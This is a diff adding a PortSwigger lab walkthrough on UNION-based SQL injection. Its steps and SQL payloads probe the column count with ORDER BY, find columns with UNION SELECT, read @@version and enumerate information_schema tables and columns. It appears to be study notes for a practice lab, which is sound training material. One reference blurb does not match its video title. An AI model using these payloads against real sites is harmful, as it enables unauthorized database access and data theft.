@@ -845,9 +845,116 @@ To solve the lab, display the database version string.
 
 >Note: You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).
 
+![Open labs 0.7](images/lab-0.7-database-version/open-labs-0.7.png)
+
+![Click gift parameters](images/lab-0.7-database-version/gift-parameter-0.7.png)
+
+![Open HTTP history send to repeater parameters Gifts request 0.7](images/lab-0.7-database-version/http-history-to-repeater-0.7.png)
+
+![testing error 0.7](images/lab-0.7-database-version/error-0.7.png)
+
+![comment error -- 0.7](images/lab-0.7-database-version/error-comment-0.7.png)
+
+![success comment use operator --+ 0.7](images/lab-0.7-database-version/success-comment-0.7.png)
+
+![try order by 1 0.7](images/lab-0.7-database-version/order-by-1-0.7.png)
+
+![try order by 2 0.7](images/lab-0.7-database-version/order-by-2-0.7.png)
+
+![success get error place columns values order by 3 0.7](images/lab-0.7-database-version/error-order-by-3-0.7.png)
+
+![give a values UNION SELECT use NULL 0.7](images/lab-0.7-database-version/give-union-select-null-null-0.7.png)
+
+![try columns input string a 'VULN' to try search in respone and frontend 0.7](images/lab-0.7-database-version/input-string-vuln-0.7.png)
+
+![try input @@version values to check version operating system 0.7](images/lab-0.7-database-version/check-version-0.7.png)
+
+##### Tutorial
+
+1. Open browser and active proxy search parameters `Gifts` and then check history send to repeater a requetst.
+2. Modify give a values `'` to see behaviour HTTP error 500.
+3. Modify give a values comment `--` if error code 500 you can try add `--+` and send request have a comment success load code 200.
+4. Modify send a values `ORDER BY` for search error.
+5. If success get error value from testing `ORDER BY`:
+```sql
+' ORDER BY 1--+ 200 OK
+' ORDER BY 2--+ 200 OK
+' ORDER BY 3--+ 500 Internal server erorr
+```
+6. Try a values `UNION SELECT` use NULL and testing input string 'VULN' to try columns place.:
+```SQL
+' UNION SELECT NULL,NULL--+
+' UNION SELECT 'VULN','VULN'--+
+```
+7. Last try to give a values to check version operating system use `@@VERSION`.
+```SQL
+' UNION SELECT @@version,'VULN'--+
+```
+
+##### Reference
+
+<details>
+<summary> 18. SQL Injection: Querying the Database Type and Version on MySQL and Microsoft | PortSwigger Lab — Michael Sommer</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=7afmKPDaZtw
+Purpose: In this episode, we take SQL injection beyond data extraction and use it to bypass authentication entirely. By intercepting a login request in Burp Suite and manipulating the username field, we get logged in as the administrator account — without ever knowing, or needing, the correct password.
+</details>
+
+<details>
+<summary>19. SQL Injection - Lab #8 SQLi attack, querying the database type and version on MySQL & Microsoft — Rana Khalil</summary>
+
+Platform: YouTube
+Video: https://www.youtube.com/watch?v=MFTk_LNRW0g
+Purpose: This lab contains a SQL injection vulnerability in the product category field. To solve the lab, we perform a UNION based SQL injection attack that queries the database type and version on Microsoft and MySQL databases.
+
+</details>
+
+<details>
+<summary> 20. SQL Injection Attack - Querying the Database Type and Version MySQL and Microsoft — z3nsh3ll</summary>
+
+Platform: Youtube
+Video: https://www.youtube.com/watch?v=4UxUpsCZQfI
+Purpose: In this cyber security lab we run an SQL injection attack where we query the MYSQL version of the database running on the back end. 
+</details>
+
 </details>
 
 #### Listing the contents of the database
+
+Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
+
+For example, you can query `information_schema.tables` to list the tables in the database:
+
+```sql
+SELECT * FROM information_schema.tables
+```
+This returns output like the following:
+```txt
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
+```
+This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.
+
+You can then query `information_schema.columns` to list the columns in individual tables:
+
+```sql
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
+This returns output like the following:
+
+```txt
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
+```
+This output shows the columns in the specified table and the data type of each column.
+
 ##### Lab: SQL injection attack, listing the database contents on non-Oracle databases
 
 ## Blind SQL injection
